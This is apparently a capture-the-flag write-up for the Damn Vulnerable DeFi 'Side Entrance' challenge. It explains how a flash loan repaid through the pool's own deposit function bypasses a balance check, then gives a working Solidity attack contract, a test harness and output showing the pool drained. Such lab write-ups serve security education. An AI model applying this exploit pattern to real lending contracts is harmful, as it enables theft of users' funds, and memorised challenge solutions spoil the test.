# Challenge - Side Entrance

A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.

It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.

## Objective of CTF

Yoy start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.

## Vulnerability Analysis

The `SideEntranceLenderPool` contract offers a flashloan feature, implemented as follows:

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    if (address(this).balance < balanceBefore) {
        revert RepayFailed();
    }
}
```

This function allows a flashloan initiator to implement an `execute()` function that can perform any action. The only requirement is that the initiator must repay the borrowed ETH. Under normal circumstances, the repayment is made directly. However, there is a potential vulnerability: the `SideEntranceLenderPool` contract also provides deposit and withdrawal functionalities for ETH. By taking a flashloan and depositing the borrowed ETH back into the pool during the loan execution, you can bypass the balance check. After the flashloan process is complete, you can then withdraw the deposited ETH from the pool based on the deposit record, effectively allowing you to keep the borrowed amount.

### Attack steps:

1. Initiate a flashLoan() and deposit the borrowed ETH back into the pool to bypass the balance check within the `flashLoan()` function.
2. Withdraw all the ETH from the pool to a specified the recovery address.

## PoC test case

### Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Ownable} from "solady/auth/Ownable.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract AttackSideEntrance is Ownable {
    address private immutable pool;
    address private immutable recovery;

    constructor(address _pool, address _recovery) {
        _initializeOwner(msg.sender);

        pool = _pool;
        recovery = _recovery;
    }

    function attack(uint256 amount) external onlyOwner {
        // initiate a flashloan from the pool
        ISideEntranceLenderPool(pool).flashLoan(amount);
        // withdraw the ETH deposited during the flashloan
        ISideEntranceLenderPool(pool).withdraw();
    }

    function execute() external payable {
        require(msg.sender == pool, "Not pool");
        // repay the borrowed ETH by depositing it back into the pool
        ISideEntranceLenderPool(pool).deposit{value: msg.value}();
    }

    receive() external payable {
        (bool success,) = recovery.call{value: msg.value}("");
        require(success, "Failed to send ether");
    }
}
```

### Test contract

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
import {AttackSideEntrance} from "../../src/side-entrance/AttackSideEntrance.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        emit log("-------------------------- Before exploit --------------------------");
        emit log_named_decimal_uint("ETH balance in the pool contract", address(pool).balance, 18);
        emit log_named_decimal_uint("ETH balance in the recovery", recovery.balance, 18);

        AttackSideEntrance maliciousContract = new AttackSideEntrance(address(pool), recovery);
        maliciousContract.attack(ETHER_IN_POOL);

        emit log("-------------------------- After exploit --------------------------");
        emit log_named_decimal_uint("ETH balance in the pool contract", address(pool).balance, 18);
        emit log_named_decimal_uint("ETH balance in the recovery", recovery.balance, 18);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}
```

### Test Result

```
Ran 2 tests for test/side-entrance/SideEntrance.t.sol:SideEntranceChallenge
[PASS] test_assertInitialState() (gas: 12975)
[PASS] test_sideEntrance() (gas: 435173)
Logs:
  -------------------------- Before exploit --------------------------
  ETH balance in the pool contract: 1000.000000000000000000
  ETH balance in the recovery: 0.000000000000000000
  -------------------------- After exploit --------------------------
  ETH balance in the pool contract: 0.000000000000000000
  ETH balance in the recovery: 1000.000000000000000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 7.75ms (721.71µs CPU time)

Ran 1 test suite in 264.05ms (7.75ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
